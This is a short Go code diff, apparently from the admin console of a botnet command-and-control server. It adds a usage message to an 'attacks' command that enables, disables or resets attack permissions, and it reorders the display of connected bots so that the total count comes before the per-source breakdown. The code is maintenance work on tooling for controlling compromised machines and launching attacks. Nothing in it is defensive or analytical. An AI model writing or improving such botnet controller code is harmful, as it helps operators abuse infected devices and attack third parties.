@@ -200,6 +200,11 @@ func Admin(conn net.Conn) {
 				continue
 			}
 
+			if len(args) == 0 {
+				session.Conn.Write([]byte(InfoMsg("Usage: attacks <enable|disable|global|reset_user>") + "\r\n"))
+				continue
+			}
+
 			switch strings.ToLower(args[0]) {
 			case "enable", "active", "attacks":
 				Attacks = true
@@ -249,11 +254,11 @@ func Admin(conn net.Conn) {
 				continue
 			}
 
-			session.Conn.Write([]byte(fmt.Sprintf("\r\n%s%s CONNECTED BOTS BY SOURCE:%s\r\n\r\n", Bold, Cyan, Reset)))
+			session.Conn.Write([]byte(fmt.Sprintf("%sTotal:%s %s%d%s bots connected\r\n", Bold+White, Reset, Green, len(Clients), Reset)))
+			
 			for source, amount := range SortClients(make(map[string]int)) {
 				session.Conn.Write([]byte(fmt.Sprintf(" %s%-15s%s %s→%s  %s%d%s bots\r\n", LightCyan, source, Reset, DarkCyan, Reset, Green, amount, Reset)))
 			}
-			session.Conn.Write([]byte(fmt.Sprintf("\r\n%sTotal:%s %s%d%s bots connected\r\n", Bold+White, Reset, Green, len(Clients), Reset)))
 
 			continue
 
@@ -784,7 +789,6 @@ func Admin(conn net.Conn) {
 	}
 }
 
-// FormatBool mantém compatibilidade mas usa a versão colorida
 func FormatBool(b bool) string {
 	return FormatBoolColored(b)
 }
